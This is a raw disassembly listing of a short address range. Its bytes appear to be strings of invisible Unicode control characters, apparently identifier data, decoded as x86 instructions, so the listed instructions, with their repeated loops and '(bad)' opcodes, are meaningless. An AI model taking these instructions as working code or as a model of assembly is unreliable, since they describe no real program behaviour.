  40873b:	aa                   	stos   %al,%es:(%edi)
  40873c:	e2 81                	loop   0x4086bf
  40873e:	ac                   	lods   %ds:(%esi),%al
  40873f:	e2 80                	loop   0x4086c1
  408741:	ad                   	lods   %ds:(%esi),%eax
  408742:	e2 80                	loop   0x4086c4
  408744:	aa                   	stos   %al,%es:(%edi)
  408745:	e2 81                	loop   0x4086c8
  408747:	ae                   	scas   %es:(%edi),%al
  408748:	e2 80                	loop   0x4086ca
  40874a:	8f                   	(bad)
  40874b:	e2 81                	loop   0x4086ce
  40874d:	ac                   	lods   %ds:(%esi),%al
  40874e:	e2 80                	loop   0x4086d0
  408750:	8d                   	lea    (bad),%esp
  408751:	e2 80                	loop   0x4086d3
  408753:	8e e2                	mov    %edx,%fs
  408755:	80 ab e2 80 ac e2 80 	subb   $0x80,-0x1d537f1e(%ebx)
  40875c:	8f                   	(bad)
  40875d:	e2 80                	loop   0x4086df
  40875f:	8f                   	(bad)
  408760:	e2 80                	loop   0x4086e2
  408762:	8e e2                	mov    %edx,%fs
  408764:	81 ab e2 80 aa e2 81 	subl   $0x80e2ac81,-0x1d557f1e(%ebx)
  40876b:	ac e2 80 
  40876e:	8d                   	lea    (bad),%esp
  40876f:	e2 81                	loop   0x4086f2
  408771:	ac                   	lods   %ds:(%esi),%al
  408772:	e2 80                	loop   0x4086f4
  408774:	8e e2                	mov    %edx,%fs
  408776:	80 8f e2 80 8d e2 81 	orb    $0x81,-0x1d727f1e(%edi)
  40877d:	ae                   	scas   %es:(%edi),%al
  40877e:	e2 80                	loop   0x408700
  408780:	ab                   	stos   %eax,%es:(%edi)
  408781:	e2 81                	loop   0x408704
  408783:	ab                   	stos   %eax,%es:(%edi)
  408784:	e2 80                	loop   0x408706
  408786:	ae                   	scas   %es:(%edi),%al
  408787:	e2 80                	loop   0x408709
  408789:	8b e2                	mov    %edx,%esp
  40878b:	80 aa e2 80 8c e2 80 	subb   $0x80,-0x1d737f1e(%edx)
  408792:	ac                   	lods   %ds:(%esi),%al
  408793:	e2 81                	loop   0x408716
  408795:	ac                   	lods   %ds:(%esi),%al
  408796:	e2 80                	loop   0x408718
  408798:	8f                   	(bad)
  408799:	e2 80                	loop   0x40871b
  40879b:	aa                   	stos   %al,%es:(%edi)
  40879c:	e2 81                	loop   0x40871f
  40879e:	af                   	scas   %es:(%edi),%eax
  40879f:	e2 80                	loop   0x408721
  4087a1:	8b e2                	mov    %edx,%esp
  4087a3:	80 ae e2 80 8b e2 80 	subb   $0x80,-0x1d747f1e(%esi)
  4087aa:	aa                   	stos   %al,%es:(%edi)
  4087ab:	e2 80                	loop   0x40872d
  4087ad:	ae                   	scas   %es:(%edi),%al
  4087ae:	00 e2                	add    %ah,%dl
  4087b0:	81 ad e2 80 ae e2 80 	subl   $0x80e28e80,-0x1d517f1e(%ebp)
  4087b7:	8e e2 80 
  4087ba:	8c e2                	mov    %fs,%edx
  4087bc:	80 8c e2 81 ad e2 81 	orb    $0xad,-0x7e1d527f(%edx,%eiz,8)
  4087c3:	ad 
  4087c4:	e2 81                	loop   0x408747
  4087c6:	ae                   	scas   %es:(%edi),%al
  4087c7:	e2 81                	loop   0x40874a
  4087c9:	af                   	scas   %es:(%edi),%eax
  4087ca:	e2 81                	loop   0x40874d
  4087cc:	af                   	scas   %es:(%edi),%eax
  4087cd:	e2 80                	loop   0x40874f
  4087cf:	ab                   	stos   %eax,%es:(%edi)
  4087d0:	e2 80                	loop   0x408752
  4087d2:	ad                   	lods   %ds:(%esi),%eax
  4087d3:	e2 80                	loop   0x408755
  4087d5:	ad                   	lods   %ds:(%esi),%eax
  4087d6:	e2 80                	loop   0x408758
  4087d8:	8f                   	(bad)
  4087d9:	e2 81                	loop   0x40875c
  4087db:	ab                   	stos   %eax,%es:(%edi)
  4087dc:	e2 80                	loop   0x40875e
  4087de:	ac                   	lods   %ds:(%esi),%al
  4087df:	e2 81                	loop   0x408762
  4087e1:	ab                   	stos   %eax,%es:(%edi)
  4087e2:	e2 80                	loop   0x408764
  4087e4:	ad                   	lods   %ds:(%esi),%eax
  4087e5:	e2 81                	loop   0x408768
  4087e7:	ab                   	stos   %eax,%es:(%edi)
  4087e8:	e2 80                	loop   0x40876a
  4087ea:	8f                   	(bad)
  4087eb:	e2 80                	loop   0x40876d
  4087ed:	8e e2                	mov    %edx,%fs
  4087ef:	81 ae e2 81 ad e2 80 	subl   $0x80e28b80,-0x1d527e1e(%esi)
  4087f6:	8b e2 80 
  4087f9:	8d                   	lea    (bad),%esp
  4087fa:	e2 81                	loop   0x40877d
  4087fc:	aa                   	stos   %al,%es:(%edi)
  4087fd:	e2 81                	loop   0x408780
  4087ff:	ad                   	lods   %ds:(%esi),%eax
  408800:	e2 81                	loop   0x408783
  408802:	af                   	scas   %es:(%edi),%eax
  408803:	e2 80                	loop   0x408785
  408805:	8c e2                	mov    %fs,%edx
  408807:	80 8e e2 80 8d e2 81 	orb    $0x81,-0x1d727f1e(%esi)
  40880e:	ab                   	stos   %eax,%es:(%edi)
  40880f:	e2 80                	loop   0x408791
  408811:	8c e2                	mov    %fs,%edx
  408813:	80 ad e2 81 ad e2 80 	subb   $0x80,-0x1d527e1e(%ebp)
  40881a:	ae                   	scas   %es:(%edi),%al
  40881b:	e2 80                	loop   0x40879d
  40881d:	8c e2                	mov    %fs,%edx
  40881f:	80 8f e2 80 8e e2 80 	orb    $0x80,-0x1d717f1e(%edi)
  408826:	aa                   	stos   %al,%es:(%edi)
  408827:	e2 80                	loop   0x4087a9
  408829:	ae                   	scas   %es:(%edi),%al
  40882a:	00 e2                	add    %ah,%dl
  40882c:	80 ae e2 80 8c e2 80 	subb   $0x80,-0x1d737f1e(%esi)
  408833:	ac                   	lods   %ds:(%esi),%al
  408834:	e2 81                	loop   0x4087b7
  408836:	ad                   	lods   %ds:(%esi),%eax
  408837:	e2 80                	loop   0x4087b9
  408839:	ae                   	scas   %es:(%edi),%al
  40883a:	e2 80                	loop   0x4087bc
  40883c:	ad                   	lods   %ds:(%esi),%eax
  40883d:	e2 81                	loop   0x4087c0
  40883f:	ae                   	scas   %es:(%edi),%al
  408840:	e2 81                	loop   0x4087c3
  408842:	ad                   	lods   %ds:(%esi),%eax
  408843:	e2 81                	loop   0x4087c6
  408845:	aa                   	stos   %al,%es:(%edi)
  408846:	e2 80                	loop   0x4087c8
  408848:	ac                   	lods   %ds:(%esi),%al
  408849:	e2 80                	loop   0x4087cb
  40884b:	8f                   	(bad)
  40884c:	e2 80                	loop   0x4087ce
  40884e:	8b e2                	mov    %edx,%esp
  408850:	81 ae e2 80 8d e2 81 	subl   $0x80e2af81,-0x1d727f1e(%esi)
  408857:	af e2 80 
  40885a:	8b e2                	mov    %edx,%esp
  40885c:	81 ad e2 80 ad e2 81 	subl   $0x81e2ae81,-0x1d527f1e(%ebp)
  408863:	ae e2 81 
  408866:	ae                   	scas   %es:(%edi),%al
  408867:	e2 81                	loop   0x4087ea
  408869:	ae                   	scas   %es:(%edi),%al
  40886a:	e2 81                	loop   0x4087ed
  40886c:	ab                   	stos   %eax,%es:(%edi)
  40886d:	e2 81                	loop   0x4087f0
  40886f:	ae                   	scas   %es:(%edi),%al
  408870:	e2 80                	loop   0x4087f2
  408872:	ae                   	scas   %es:(%edi),%al
  408873:	e2 81                	loop   0x4087f6
  408875:	ab                   	stos   %eax,%es:(%edi)
  408876:	e2 81                	loop   0x4087f9
  408878:	af                   	scas   %es:(%edi),%eax
  408879:	e2 80                	loop   0x4087fb
  40887b:	8b e2                	mov    %edx,%esp
  40887d:	80 ad e2 80 8e e2 81 	subb   $0x81,-0x1d717f1e(%ebp)
  408884:	ac                   	lods   %ds:(%esi),%al
  408885:	e2 80                	loop   0x408807
  408887:	ad                   	lods   %ds:(%esi),%eax
  408888:	e2 80                	loop   0x40880a
  40888a:	ab                   	stos   %eax,%es:(%edi)
  40888b:	e2 81                	loop   0x40880e
  40888d:	ab                   	stos   %eax,%es:(%edi)
  40888e:	e2 80                	loop   0x408810
  408890:	8c e2                	mov    %fs,%edx
  408892:	80 ab e2 81 ab e2 80 	subb   $0x80,-0x1d547e1e(%ebx)
  408899:	ac                   	lods   %ds:(%esi),%al
  40889a:	e2 80                	loop   0x40881c
  40889c:	ae                   	scas   %es:(%edi),%al
  40889d:	e2 81                	loop   0x408820
  40889f:	ac                   	lods   %ds:(%esi),%al
  4088a0:	e2 80                	loop   0x408822
  4088a2:	aa                   	stos   %al,%es:(%edi)
  4088a3:	e2 80                	loop   0x408825
  4088a5:	ae                   	scas   %es:(%edi),%al
  4088a6:	00 e2                	add    %ah,%dl
  4088a8:	80 ad e2 80 8d e2 81 	subb   $0x81,-0x1d727f1e(%ebp)
  4088af:	ae                   	scas   %es:(%edi),%al
  4088b0:	e2 80                	loop   0x408832
  4088b2:	8e e2                	mov    %edx,%fs
  4088b4:	80 8f e2 81 ac e2 80 	orb    $0x80,-0x1d537e1e(%edi)
  4088bb:	8d                   	lea    (bad),%esp
  4088bc:	e2 80                	loop   0x40883e
  4088be:	8f                   	(bad)
  4088bf:	e2 81                	loop   0x408842
  4088c1:	ac                   	lods   %ds:(%esi),%al
  4088c2:	e2 81                	loop   0x408845
  4088c4:	ab                   	stos   %eax,%es:(%edi)
  4088c5:	e2 81                	loop   0x408848
  4088c7:	ad                   	lods   %ds:(%esi),%eax
  4088c8:	e2 80                	loop   0x40884a
  4088ca:	8c e2                	mov    %fs,%edx
  4088cc:	81 ad e2 81 ad e2 81 	subl   $0x80e2af81,-0x1d527e1e(%ebp)
  4088d3:	af e2 80 
  4088d6:	ad                   	lods   %ds:(%esi),%eax
  4088d7:	e2 80                	loop   0x408859
  4088d9:	8e e2                	mov    %edx,%fs
  4088db:	81 aa e2 80 8b e2 80 	subl   $0x81e2aa80,-0x1d747f1e(%edx)
  4088e2:	aa e2 81 
  4088e5:	ad                   	lods   %ds:(%esi),%eax
  4088e6:	e2 81                	loop   0x408869
  4088e8:	af                   	scas   %es:(%edi),%eax
  4088e9:	e2 80                	loop   0x40886b
  4088eb:	ab                   	stos   %eax,%es:(%edi)
  4088ec:	e2 80                	loop   0x40886e
  4088ee:	ad                   	lods   %ds:(%esi),%eax
  4088ef:	e2 81                	loop   0x408872
  4088f1:	aa                   	stos   %al,%es:(%edi)
  4088f2:	e2 81                	loop   0x408875
  4088f4:	ac                   	lods   %ds:(%esi),%al
  4088f5:	e2 81                	loop   0x408878
  4088f7:	ac                   	lods   %ds:(%esi),%al
  4088f8:	e2 81                	loop   0x40887b
  4088fa:	ab                   	stos   %eax,%es:(%edi)
  4088fb:	e2 81                	loop   0x40887e
  4088fd:	ad                   	lods   %ds:(%esi),%eax
  4088fe:	e2 80                	loop   0x408880
  408900:	8d                   	lea    (bad),%esp
  408901:	e2 81                	loop   0x408884
  408903:	ae                   	scas   %es:(%edi),%al
  408904:	e2 80                	loop   0x408886
  408906:	ad                   	lods   %ds:(%esi),%eax
  408907:	e2 80                	loop   0x408889
  408909:	8b e2                	mov    %edx,%esp
  40890b:	80 8b e2 80 ab e2 81 	orb    $0x81,-0x1d547f1e(%ebx)
  408912:	ab                   	stos   %eax,%es:(%edi)
  408913:	e2 81                	loop   0x408896
  408915:	ad                   	lods   %ds:(%esi),%eax
  408916:	e2 80                	loop   0x408898
  408918:	8d                   	lea    (bad),%esp
  408919:	e2 80                	loop   0x40889b
  40891b:	ad                   	lods   %ds:(%esi),%eax
  40891c:	e2 80                	loop   0x40889e
  40891e:	aa                   	stos   %al,%es:(%edi)
  40891f:	e2 80                	loop   0x4088a1
  408921:	ae                   	scas   %es:(%edi),%al
  408922:	00 e2                	add    %ah,%dl
  408924:	80 8f e2 81 ab e2 81 	orb    $0x81,-0x1d547e1e(%edi)
  40892b:	aa                   	stos   %al,%es:(%edi)
  40892c:	e2 80                	loop   0x4088ae
  40892e:	ab                   	stos   %eax,%es:(%edi)
  40892f:	e2 80                	loop   0x4088b1
  408931:	8c e2                	mov    %fs,%edx
  408933:	80 8b e2 80 ac e2 80 	orb    $0x80,-0x1d537f1e(%ebx)
  40893a:	8d                   	lea    (bad),%esp
  40893b:	e2 80                	loop   0x4088bd
  40893d:	8e e2                	mov    %edx,%fs
  40893f:	80 8b e2 80 ac e2 80 	orb    $0x80,-0x1d537f1e(%ebx)
  408946:	ae                   	scas   %es:(%edi),%al
  408947:	e2 81                	loop   0x4088ca
  408949:	ae                   	scas   %es:(%edi),%al
  40894a:	e2 80                	loop   0x4088cc
  40894c:	8e e2                	mov    %edx,%fs
  40894e:	80 8b e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%ebx)
  408955:	8d                   	lea    (bad),%esp
  408956:	e2 81                	loop   0x4088d9
  408958:	ae                   	scas   %es:(%edi),%al
  408959:	e2 80                	loop   0x4088db
  40895b:	8f                   	(bad)
  40895c:	e2 80                	loop   0x4088de
  40895e:	8d                   	lea    (bad),%esp
  40895f:	e2 81                	loop   0x4088e2
  408961:	ab                   	stos   %eax,%es:(%edi)
  408962:	e2 80                	loop   0x4088e4
  408964:	8e e2                	mov    %edx,%fs
  408966:	80 ae e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%esi)
  40896d:	8e e2                	mov    %edx,%fs
  40896f:	80 aa e2 81 aa e2 80 	subb   $0x80,-0x1d557e1e(%edx)
  408976:	8c e2                	mov    %fs,%edx
  408978:	80 aa e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%edx)
  40897f:	8e e2                	mov    %edx,%fs
  408981:	80 ae e2 80 8e e2 80 	subb   $0x80,-0x1d717f1e(%esi)
  408988:	8c e2                	mov    %fs,%edx
  40898a:	80 ad e2 80 8c e2 80 	subb   $0x80,-0x1d737f1e(%ebp)
  408991:	8c e2                	mov    %fs,%edx
  408993:	81 ad e2 80 aa e2 80 	subl   $0xe200ae80,-0x1d557f1e(%ebp)
  40899a:	ae 00 e2 
  40899d:	81 aa e2 81 ae e2 80 	subl   $0x81e28f80,-0x1d517e1e(%edx)
  4089a4:	8f e2 81 
  4089a7:	ae                   	scas   %es:(%edi),%al
  4089a8:	e2 80                	loop   0x40892a
  4089aa:	8b e2                	mov    %edx,%esp
  4089ac:	80 ae e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%esi)
  4089b3:	ae                   	scas   %es:(%edi),%al
  4089b4:	e2 80                	loop   0x408936
  4089b6:	ae                   	scas   %es:(%edi),%al
  4089b7:	e2 80                	loop   0x408939
  4089b9:	8e e2                	mov    %edx,%fs
  4089bb:	81 ab e2 80 ac e2 80 	subl   $0x81e28d80,-0x1d537f1e(%ebx)
  4089c2:	8d e2 81 
  4089c5:	ab                   	stos   %eax,%es:(%edi)
  4089c6:	e2 80                	loop   0x408948
  4089c8:	8f                   	(bad)
  4089c9:	e2 81                	loop   0x40894c
  4089cb:	ac                   	lods   %ds:(%esi),%al
  4089cc:	e2 80                	loop   0x40894e
  4089ce:	8c e2                	mov    %fs,%edx
  4089d0:	80 ac e2 81 ab e2 80 	subb   $0x8f,-0x7f1d547f(%edx,%eiz,8)
  4089d7:	8f 
  4089d8:	e2 81                	loop   0x40895b
  4089da:	af                   	scas   %es:(%edi),%eax
  4089db:	e2 81                	loop   0x40895e
  4089dd:	ae                   	scas   %es:(%edi),%al
  4089de:	e2 80                	loop   0x408960
  4089e0:	8d                   	lea    (bad),%esp
  4089e1:	e2 80                	loop   0x408963
  4089e3:	ae                   	scas   %es:(%edi),%al
  4089e4:	e2 81                	loop   0x408967
  4089e6:	af                   	scas   %es:(%edi),%eax
  4089e7:	e2 80                	loop   0x408969
  4089e9:	8e e2                	mov    %edx,%fs
  4089eb:	80 8d e2 81 ac e2 80 	orb    $0x80,-0x1d537e1e(%ebp)
  4089f2:	8d                   	lea    (bad),%esp
  4089f3:	e2 81                	loop   0x408976
  4089f5:	ad                   	lods   %ds:(%esi),%eax
  4089f6:	e2 80                	loop   0x408978
  4089f8:	ad                   	lods   %ds:(%esi),%eax
  4089f9:	e2 81                	loop   0x40897c
  4089fb:	ae                   	scas   %es:(%edi),%al
  4089fc:	e2 81                	loop   0x40897f
  4089fe:	aa                   	stos   %al,%es:(%edi)
  4089ff:	e2 80                	loop   0x408981
  408a01:	8b e2                	mov    %edx,%esp
  408a03:	80 8e e2 81 ac e2 81 	orb    $0x81,-0x1d537e1e(%esi)
  408a0a:	ad                   	lods   %ds:(%esi),%eax
  408a0b:	e2 80                	loop   0x40898d
  408a0d:	8f                   	(bad)
  408a0e:	e2 80                	loop   0x408990
  408a10:	8c e2                	mov    %fs,%edx
  408a12:	81 aa e2 80 ae 00 e2 	subl   $0xe28b80e2,0xae80e2(%edx)
  408a19:	80 8b e2 
  408a1c:	80 8f e2 81 aa e2 81 	orb    $0x81,-0x1d557e1e(%edi)
  408a23:	ae                   	scas   %es:(%edi),%al
  408a24:	e2 80                	loop   0x4089a6
  408a26:	ae                   	scas   %es:(%edi),%al
  408a27:	e2 80                	loop   0x4089a9
  408a29:	ac                   	lods   %ds:(%esi),%al
  408a2a:	e2 81                	loop   0x4089ad
  408a2c:	ad                   	lods   %ds:(%esi),%eax
  408a2d:	e2 80                	loop   0x4089af
  408a2f:	8f                   	(bad)
  408a30:	e2 80                	loop   0x4089b2
  408a32:	8e e2                	mov    %edx,%fs
  408a34:	80 ac e2 81 ac e2 80 	subb   $0x8d,-0x7f1d537f(%edx,%eiz,8)
  408a3b:	8d 
  408a3c:	e2 80                	loop   0x4089be
  408a3e:	8e e2                	mov    %edx,%fs
  408a40:	81 ae e2 80 8b e2 81 	subl   $0x81e2aa81,-0x1d747f1e(%esi)
  408a47:	aa e2 81 
  408a4a:	ac                   	lods   %ds:(%esi),%al
  408a4b:	e2 80                	loop   0x4089cd
  408a4d:	ac                   	lods   %ds:(%esi),%al
  408a4e:	e2 80                	loop   0x4089d0
  408a50:	8f                   	(bad)
  408a51:	e2 80                	loop   0x4089d3
  408a53:	aa                   	stos   %al,%es:(%edi)
  408a54:	e2 80                	loop   0x4089d6
  408a56:	aa                   	stos   %al,%es:(%edi)
  408a57:	e2 81                	loop   0x4089da
  408a59:	ae                   	scas   %es:(%edi),%al
  408a5a:	e2 80                	loop   0x4089dc
  408a5c:	8b e2                	mov    %edx,%esp
  408a5e:	80 8d e2 80 ad e2 81 	orb    $0x81,-0x1d527f1e(%ebp)
  408a65:	af                   	scas   %es:(%edi),%eax
  408a66:	e2 81                	loop   0x4089e9
  408a68:	ae                   	scas   %es:(%edi),%al
  408a69:	e2 80                	loop   0x4089eb
  408a6b:	ab                   	stos   %eax,%es:(%edi)
  408a6c:	e2 81                	loop   0x4089ef
  408a6e:	ae                   	scas   %es:(%edi),%al
  408a6f:	e2 80                	loop   0x4089f1
  408a71:	aa                   	stos   %al,%es:(%edi)
  408a72:	e2 80                	loop   0x4089f4
  408a74:	aa                   	stos   %al,%es:(%edi)
  408a75:	e2 80                	loop   0x4089f7
  408a77:	ad                   	lods   %ds:(%esi),%eax
  408a78:	e2 80                	loop   0x4089fa
  408a7a:	ae                   	scas   %es:(%edi),%al
  408a7b:	e2 80                	loop   0x4089fd
  408a7d:	ae                   	scas   %es:(%edi),%al
  408a7e:	e2 81                	loop   0x408a01
  408a80:	ac                   	lods   %ds:(%esi),%al
  408a81:	e2 81                	loop   0x408a04
  408a83:	ad                   	lods   %ds:(%esi),%eax
  408a84:	e2 80                	loop   0x408a06
  408a86:	ae                   	scas   %es:(%edi),%al
  408a87:	e2 81                	loop   0x408a0a
  408a89:	af                   	scas   %es:(%edi),%eax
  408a8a:	e2 80                	loop   0x408a0c
  408a8c:	8c e2                	mov    %fs,%edx
  408a8e:	81 aa e2 80 ae 00 e2 	subl   $0xe2ad81e2,0xae80e2(%edx)
  408a95:	81 ad e2 
  408a98:	81 af e2 81 af e2 80 	subl   $0x80e2aa80,-0x1d507e1e(%edi)
  408a9f:	aa e2 80 
  408aa2:	8d                   	lea    (bad),%esp
  408aa3:	e2 81                	loop   0x408a26
  408aa5:	aa                   	stos   %al,%es:(%edi)
  408aa6:	e2 80                	loop   0x408a28
  408aa8:	8c e2                	mov    %fs,%edx
  408aaa:	81 aa e2 81 af e2 81 	subl   $0x80e2af81,-0x1d507e1e(%edx)
  408ab1:	af e2 80 
  408ab4:	8e e2                	mov    %edx,%fs
  408ab6:	81 aa e2 80 aa e2 80 	subl   $0x80e28c80,-0x1d557f1e(%edx)
  408abd:	8c e2 80 
  408ac0:	8f                   	(bad)
  408ac1:	e2 80                	loop   0x408a43
  408ac3:	ac                   	lods   %ds:(%esi),%al
  408ac4:	e2 80                	loop   0x408a46
  408ac6:	aa                   	stos   %al,%es:(%edi)
  408ac7:	e2 81                	loop   0x408a4a
  408ac9:	aa                   	stos   %al,%es:(%edi)
  408aca:	e2 80                	loop   0x408a4c
  408acc:	ae                   	scas   %es:(%edi),%al
  408acd:	e2 81                	loop   0x408a50
  408acf:	af                   	scas   %es:(%edi),%eax
  408ad0:	e2 80                	loop   0x408a52
  408ad2:	8b e2                	mov    %edx,%esp
  408ad4:	81 ad e2 80 ac e2 80 	subl   $0x80e2ad80,-0x1d537f1e(%ebp)
  408adb:	ad e2 80 
  408ade:	ab                   	stos   %eax,%es:(%edi)
  408adf:	e2 80                	loop   0x408a61
  408ae1:	8e e2                	mov    %edx,%fs
  408ae3:	80 ab e2 80 ac e2 80 	subb   $0x80,-0x1d537f1e(%ebx)
  408aea:	8b e2                	mov    %edx,%esp
  408aec:	81 ab e2 81 ad e2 80 	subl   $0x80e2ac80,-0x1d527e1e(%ebx)
  408af3:	ac e2 80 
  408af6:	aa                   	stos   %al,%es:(%edi)
  408af7:	e2 80                	loop   0x408a79
  408af9:	ae                   	scas   %es:(%edi),%al
  408afa:	e2 80                	loop   0x408a7c
  408afc:	aa                   	stos   %al,%es:(%edi)
  408afd:	e2 80                	loop   0x408a7f
  408aff:	ae                   	scas   %es:(%edi),%al
  408b00:	e2 81                	loop   0x408a83
  408b02:	ac                   	lods   %ds:(%esi),%al
  408b03:	e2 81                	loop   0x408a86
  408b05:	aa                   	stos   %al,%es:(%edi)
  408b06:	e2 80                	loop   0x408a88
  408b08:	ab                   	stos   %eax,%es:(%edi)
  408b09:	e2 81                	loop   0x408a8c
  408b0b:	aa                   	stos   %al,%es:(%edi)
  408b0c:	e2 80                	loop   0x408a8e
  408b0e:	ae                   	scas   %es:(%edi),%al
  408b0f:	00 e2                	add    %ah,%dl
  408b11:	80 8f e2 81 ad e2 80 	orb    $0x80,-0x1d527e1e(%edi)
  408b18:	8f                   	(bad)
  408b19:	e2 81                	loop   0x408a9c
  408b1b:	ac                   	lods   %ds:(%esi),%al
  408b1c:	e2 80                	loop   0x408a9e
  408b1e:	8e e2                	mov    %edx,%fs
  408b20:	81 ae e2 80 ad e2 80 	subl   $0x81e2ab80,-0x1d527f1e(%esi)
  408b27:	ab e2 81 
  408b2a:	ae                   	scas   %es:(%edi),%al
  408b2b:	e2 80                	loop   0x408aad
  408b2d:	8e e2                	mov    %edx,%fs
  408b2f:	80 8d e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%ebp)
  408b36:	ae                   	scas   %es:(%edi),%al
  408b37:	e2 80                	loop   0x408ab9
  408b39:	ab                   	stos   %eax,%es:(%edi)
  408b3a:	e2 80                	loop   0x408abc
  408b3c:	8e e2                	mov    %edx,%fs
  408b3e:	81 ad e2 80 ae e2 80 	subl   $0x80e28b80,-0x1d517f1e(%ebp)
  408b45:	8b e2 80 
  408b48:	ae                   	scas   %es:(%edi),%al
  408b49:	e2 80                	loop   0x408acb
  408b4b:	8f                   	(bad)
  408b4c:	e2 80                	loop   0x408ace
  408b4e:	ad                   	lods   %ds:(%esi),%eax
  408b4f:	e2 81                	loop   0x408ad2
  408b51:	aa                   	stos   %al,%es:(%edi)
  408b52:	e2 80                	loop   0x408ad4
  408b54:	8e e2                	mov    %edx,%fs
  408b56:	80 ac e2 81 aa e2 81 	subb   $0xad,-0x7e1d557f(%edx,%eiz,8)
  408b5d:	ad 
  408b5e:	e2 81                	loop   0x408ae1
  408b60:	aa                   	stos   %al,%es:(%edi)
  408b61:	e2 80                	loop   0x408ae3
  408b63:	8c e2                	mov    %fs,%edx
  408b65:	81 af e2 80 aa e2 80 	subl   $0x81e28d80,-0x1d557f1e(%edi)
  408b6c:	8d e2 81 
  408b6f:	ad                   	lods   %ds:(%esi),%eax
  408b70:	e2 80                	loop   0x408af2
  408b72:	ae                   	scas   %es:(%edi),%al
  408b73:	e2 80                	loop   0x408af5
  408b75:	ab                   	stos   %eax,%es:(%edi)
  408b76:	e2 80                	loop   0x408af8
  408b78:	8b e2                	mov    %edx,%esp
  408b7a:	81 ae e2 81 af e2 80 	subl   $0x80e28c80,-0x1d507e1e(%esi)
  408b81:	8c e2 80 
  408b84:	ad                   	lods   %ds:(%esi),%eax
  408b85:	e2 81                	loop   0x408b08
  408b87:	aa                   	stos   %al,%es:(%edi)
  408b88:	e2 80                	loop   0x408b0a
  408b8a:	ae                   	scas   %es:(%edi),%al
  408b8b:	00 e2                	add    %ah,%dl
  408b8d:	80 ac e2 81 ab e2 80 	subb   $0x8f,-0x7f1d547f(%edx,%eiz,8)
  408b94:	8f 
  408b95:	e2 80                	loop   0x408b17
  408b97:	ae                   	scas   %es:(%edi),%al
  408b98:	e2 80                	loop   0x408b1a
  408b9a:	ae                   	scas   %es:(%edi),%al
  408b9b:	e2 81                	loop   0x408b1e
  408b9d:	ae                   	scas   %es:(%edi),%al
  408b9e:	e2 80                	loop   0x408b20
  408ba0:	8e e2                	mov    %edx,%fs
  408ba2:	81 af e2 80 8c e2 80 	subl   $0x80e2ab80,-0x1d737f1e(%edi)
  408ba9:	ab e2 80 
  408bac:	ad                   	lods   %ds:(%esi),%eax
  408bad:	e2 80                	loop   0x408b2f
  408baf:	aa                   	stos   %al,%es:(%edi)
  408bb0:	e2 81                	loop   0x408b33
  408bb2:	ae                   	scas   %es:(%edi),%al
  408bb3:	e2 81                	loop   0x408b36
  408bb5:	ad                   	lods   %ds:(%esi),%eax
  408bb6:	e2 81                	loop   0x408b39
  408bb8:	af                   	scas   %es:(%edi),%eax
  408bb9:	e2 80                	loop   0x408b3b
  408bbb:	ae                   	scas   %es:(%edi),%al
  408bbc:	e2 80                	loop   0x408b3e
  408bbe:	8c e2                	mov    %fs,%edx
  408bc0:	80 8b e2 81 ac e2 80 	orb    $0x80,-0x1d537e1e(%ebx)
  408bc7:	ac                   	lods   %ds:(%esi),%al
  408bc8:	e2 80                	loop   0x408b4a
  408bca:	ae                   	scas   %es:(%edi),%al
  408bcb:	e2 81                	loop   0x408b4e
  408bcd:	aa                   	stos   %al,%es:(%edi)
  408bce:	e2 80                	loop   0x408b50
  408bd0:	ac                   	lods   %ds:(%esi),%al
  408bd1:	e2 80                	loop   0x408b53
  408bd3:	8f                   	(bad)
  408bd4:	e2 80                	loop   0x408b56
  408bd6:	8e e2                	mov    %edx,%fs
  408bd8:	81 af e2 80 ad e2 80 	subl   $0x81e2ac80,-0x1d527f1e(%edi)
  408bdf:	ac e2 81 
  408be2:	ac                   	lods   %ds:(%esi),%al
  408be3:	e2 80                	loop   0x408b65
  408be5:	8b e2                	mov    %edx,%esp
  408be7:	80 aa e2 80 ab e2 81 	subb   $0x81,-0x1d547f1e(%edx)
  408bee:	ab                   	stos   %eax,%es:(%edi)
  408bef:	e2 80                	loop   0x408b71
  408bf1:	ac                   	lods   %ds:(%esi),%al
  408bf2:	e2 80                	loop   0x408b74
  408bf4:	8b e2                	mov    %edx,%esp
  408bf6:	80 8c e2 80 ab e2 80 	orb    $0x8f,-0x7f1d5480(%edx,%eiz,8)
  408bfd:	8f 
  408bfe:	e2 81                	loop   0x408b81
  408c00:	ad                   	lods   %ds:(%esi),%eax
  408c01:	e2 81                	loop   0x408b84
  408c03:	aa                   	stos   %al,%es:(%edi)
  408c04:	e2 80                	loop   0x408b86
  408c06:	ae                   	scas   %es:(%edi),%al
  408c07:	00 e2                	add    %ah,%dl
  408c09:	81 af e2 81 ac e2 80 	subl   $0x80e28b80,-0x1d537e1e(%edi)
  408c10:	8b e2 80 
  408c13:	aa                   	stos   %al,%es:(%edi)
  408c14:	e2 80                	loop   0x408b96
  408c16:	8b e2                	mov    %edx,%esp
  408c18:	80 ad e2 81 ad e2 80 	subb   $0x80,-0x1d527e1e(%ebp)
  408c1f:	ac                   	lods   %ds:(%esi),%al
  408c20:	e2 80                	loop   0x408ba2
  408c22:	8b e2                	mov    %edx,%esp
  408c24:	80 ad e2 80 8d e2 80 	subb   $0x80,-0x1d727f1e(%ebp)
  408c2b:	aa                   	stos   %al,%es:(%edi)
  408c2c:	e2 80                	loop   0x408bae
  408c2e:	ad                   	lods   %ds:(%esi),%eax
  408c2f:	e2 80                	loop   0x408bb1
  408c31:	8b e2                	mov    %edx,%esp
  408c33:	80 8d e2 80 8e e2 80 	orb    $0x80,-0x1d717f1e(%ebp)
  408c3a:	ac                   	lods   %ds:(%esi),%al
  408c3b:	e2 80                	loop   0x408bbd
  408c3d:	8b e2                	mov    %edx,%esp
  408c3f:	80 ab e2 80 8d e2 80 	subb   $0x80,-0x1d727f1e(%ebx)
  408c46:	ab                   	stos   %eax,%es:(%edi)
  408c47:	e2 80                	loop   0x408bc9
  408c49:	8b e2                	mov    %edx,%esp
  408c4b:	80 8e e2 81 ab e2 81 	orb    $0x81,-0x1d547e1e(%esi)
  408c52:	aa                   	stos   %al,%es:(%edi)
  408c53:	e2 80                	loop   0x408bd5
  408c55:	ae                   	scas   %es:(%edi),%al
  408c56:	e2 80                	loop   0x408bd8
  408c58:	ab                   	stos   %eax,%es:(%edi)
  408c59:	e2 81                	loop   0x408bdc
  408c5b:	ac                   	lods   %ds:(%esi),%al
